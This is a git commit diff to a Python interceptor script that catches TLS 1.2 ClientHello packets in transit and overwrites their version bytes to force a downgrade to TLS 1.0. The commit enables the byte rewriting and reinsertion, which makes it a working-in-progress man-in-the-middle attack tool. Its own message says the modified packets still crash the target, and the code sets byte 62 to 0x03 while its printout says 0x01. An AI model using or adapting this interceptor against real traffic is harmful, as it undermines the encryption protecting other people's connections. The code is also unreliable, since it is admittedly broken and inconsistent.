fe820808b801416825b8f2ca8ecae6923d377878
Tess Sluijter <tsluyter@kilala.nl>
2020-10-08 17:53:37 +0200

    Reinserting payload now works, flipped bytes still lead to crash.
    We can now flip bytes and reinsert them into the packet. Unfortunately, actually changing them makes Flask / Werkzeug die... I think it's to do with the ip/tcp cksum that needs to be recrafted. I'll have to dig into Scapy's docu

--- TLS-downgrade/interceptor.py
+++ TLS-downgrade/interceptor.py
@@ -28,30 +28,30 @@ def packetReceived(pkt):
 
   else:
     tcpPayload = ip["Raw"].load                                             
-                                                                            
+
     # Adjusted the matching rules for Python 2 and old Scapy.               
     if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
       print("TLS handshake found, client HELLO.")                                      
-                                                                                       
+
       if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':                         
         print("TLS v1.2, dropping down to v1.0")                                       
         msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it            
         msgBytes2 = [b for b in msgBytes]                                              
-                                                                                       
+
         print("msgB is: ", type(msgBytes))                                             
         print("msgB2 is: ", type(msgBytes2))                                           
         print("Byte 61 is now: ", msgBytes2[61], ". Needs to change to 0x03.")         
         print("Byte 62 is now: ", msgBytes2[62], ". Needs to change to 0x01.")         
-                                                                                       
-#       msgBytes2[61] = '\x03'                                                         
-#       msgBytes2[62] = '\x03'                                                         
-                                                                                       
+
+        msgBytes2[61] = '\x03'                                                         
+        msgBytes2[62] = '\x03'                                                         
+
         print("Byte 61 is now: ", msgBytes2[61], ".")                                  
         print("Byte 62 is now: ", msgBytes2[62], ".")                                  
-                                                                                       
+
         msg=b''.join(msgBytes2)
         pkt.set_payload(msg)                                                      
-                                                                                       
+
       pkt.accept()                                                                     
     else:                                                                              
       pkt.accept();
